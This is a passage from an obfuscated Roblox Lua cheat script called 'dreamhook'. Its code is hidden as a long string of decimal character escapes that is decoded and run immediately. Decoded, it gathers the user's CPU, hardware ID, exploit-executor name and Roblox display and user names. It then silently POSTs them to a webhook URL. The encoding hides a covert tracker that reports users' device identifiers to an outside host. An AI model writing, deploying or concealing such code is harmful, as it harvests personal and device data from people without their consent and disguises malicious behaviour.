4\93\32\61\32\34\99\112\117\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\99\112\117\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\102\97\108\115\101\125\41\10\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\34\93\32\61\32\34\104\119\105\100\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\103\101\116\104\119\105\100\40\41\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\102\97\108\115\101\125\41\10\10\32\32\32\32\45\45\32\47\32\101\120\101\99\117\116\101\32\105\110\102\111\114\109\97\116\105\111\110\10\32\32\32\32\102\117\110\99\116\105\111\110\32\105\100\101\110\116\105\102\121\95\101\120\112\108\111\105\116\40\41\10\32\32\32\32\32\32\32\32\108\111\99\97\108\32\115\117\99\99\101\115\115\44\32\114\101\115\117\108\116\32\61\32\112\99\97\108\108\40\105\100\101\110\116\105\102\121\101\120\101\99\117\116\111\114\41\10\32\32\32\32\32\32\32\32\105\102\32\115\117\99\99\101\115\115\32\116\104\101\110\32\10\32\32\32\32\32\32\32\32\32\32\32\32\114\101\116\117\114\110\32\114\101\115\117\108\116\32\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\10\32\32\32\32\108\111\99\97\108\32\101\120\101\99\117\116\111\114\32\61\32\116\97\98\108\101\46\105\110\115\101\114\116\40\102\105\101\108\100\115\44\32\123\91\34\110\97\109\101\34\93\32\61\32\34\101\120\101\99\117\116\111\114\34\44\32\91\34\118\97\108\117\101\34\93\32\61\32\105\100\101\110\116\105\102\121\95\101\120\112\108\111\105\116\40\41\44\32\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\125\41\10\10\32\32\32\32\45\45\32\47\32\101\109\98\101\100\32\115\101\116\117\112\10\32\32\32\32\108\111\99\97\108\32\101\109\98\101\100\32\61\32\123\10\32\32\32\32\32\32\32\32\91\34\99\111\110\116\101\110\116\34\93\32\61\32\34\34\44\10\32\32\32\32\32\32\32\32\91\34\101\109\98\101\100\115\34\93\32\61\32\123\123\10\32\32\32\32\32\32\32\32\32\32\32\32\91\34\97\117\116\104\111\114\34\93\32\61\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\91\34\110\97\109\101\34\93\32\61\32\34\100\114\101\97\109\104\111\111\107\34\10\32\32\32\32\32\32\32\32\32\32\32\32\125\44\10\32\32\32\32\32\32\32\32\32\32\32\32\91\34\100\101\115\99\114\105\112\116\105\111\110\34\93\32\61\32\100\105\115\112\108\97\121\95\110\97\109\101\32\46\46\32\34\32\40\42\42\34\32\46\46\32\112\108\97\121\101\114\95\110\97\109\101\32\46\46\32\34\42\42\41\32\104\97\115\32\101\120\101\99\117\116\101\100\32\100\114\101\97\109\104\111\111\107\46\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\91\34\116\121\112\101\34\93\32\61\32\34\114\105\99\104\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\91\34\99\111\108\111\114\34\93\32\61\32\48\120\57\102\55\51\102\102\44\10\32\32\32\32\32\32\32\32\32\32\32\32\91\34\102\111\111\116\101\114\34\93\32\61\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\91\34\116\101\120\116\34\93\32\61\32\115\99\114\105\112\116\95\118\101\114\115\105\111\110\10\32\32\32\32\32\32\32\32\32\32\32\32\125\44\10\32\32\32\32\32\32\32\32\32\32\32\32\91\34\102\105\101\108\100\115\34\93\32\61\32\102\105\101\108\100\115\10\32\32\32\32\32\32\32\32\125\125\10\32\32\32\32\125\10\10\32\32\32\32\45\45\32\47\32\119\101\98\104\111\111\107\32\115\101\110\100\10\32\32\32\32\108\111\99\97\108\32\101\109\98\101\100\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\72\116\116\112\83\101\114\118\105\99\101\34\41\58\74\83\79\78\69\110\99\111\100\101\40\101\109\98\101\100\41\10\32\32\32\32\114\101\113\117\101\115\116\40\123\10\32\32\32\32\32\32\32\32\85\114\108\32\61\32\104\111\111\107\44\10\32\32\32\32\32\32\32\32\66\111\100\121\32\61\32\101\109\98\101\100\44\10\32\32\32\32\32\32\32\32\77\101\116\104\111\100\32\61\32\34\80\79\83\84\34\44\10\32\32\32\32\32\32\32\32\72\101\97\100\101\114\115\32\61\32\123\91\34\99\111\110\116\101\110\116\45\116\121\112\101\34\93\32\61\32\34\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110\34\125\10\32\32\32\32\125\41\10\101\110\100\41\10\10\114\101\116\117\114\110\32\117\105\99\10\10")()
